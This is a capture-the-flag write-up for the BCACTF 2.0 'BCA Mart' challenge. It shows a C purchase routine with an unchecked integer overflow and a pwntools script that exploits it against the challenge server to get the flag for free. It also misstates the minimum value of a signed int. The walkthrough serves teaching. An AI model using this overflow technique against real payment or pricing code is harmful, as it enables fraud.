![Challenge](https://github.com/ZeroCooL-555/CTF/blob/master/BCACTF%202.0/pwn/BCA%20Mart/challenge.png)
# Vulnerability discovery
```c
#include <stdio.h>
#include <stdlib.h>

int money = 15;

int purchase(char *item, int cost) {
    int amount;
    printf("How many %s would you like to buy?\n", item);
    printf("> ");
    scanf("%d", &amount);

    if (amount > 0) {
        cost *= amount; // Integer Overflow Here
        printf("That'll cost $%d.\n", cost);
        if (cost <= money) {
            puts("Thanks for your purchse!");
            money -= cost;
        } else {
            puts("Sorry, but you don't have enough money.");
            puts("Sucks to be you I guess.");
            amount = 0;
        }
    } else {
        puts("I'm sorry, but we don't put up with pranksters.");
        puts("Please buy something or leave.");
    }

    return amount;
}
```

Looking at the code above we can see that
we have a money variable which is of a type `int`
and we have a function called purchase.
If we take a look at the conditional statements
we can see that `cost *= amount;` is vulnerable to an
**integer overflow attack**.

# Exploitation

A signed 4-byte integer has a max value of `-2,147,483,647` to `2,147,483,647`
often denoted as `INT_MAX`. An int is by default signed which means that it can hold both negative and positive numbers,
we can use the spotted vulnerability to our advantage by giving the program a large amount of items to buy. Because the program
multiplies cost with amount we can pass the `INT_MAX` threshold and therefore make the leftmost bit which controls negative and positive
flip. Or calculate it just right to get our flag free of charge.

```python
#!/usr/bin/env python3

from pwn import *
r = remote('bin.bcactf.com', 49153)
r.sendlineafter('> ', b'6')
r.sendlineafter('> ', b'1073741824')
r.recvline()
r.recvline()
log.success(r.recvline().decode())
```
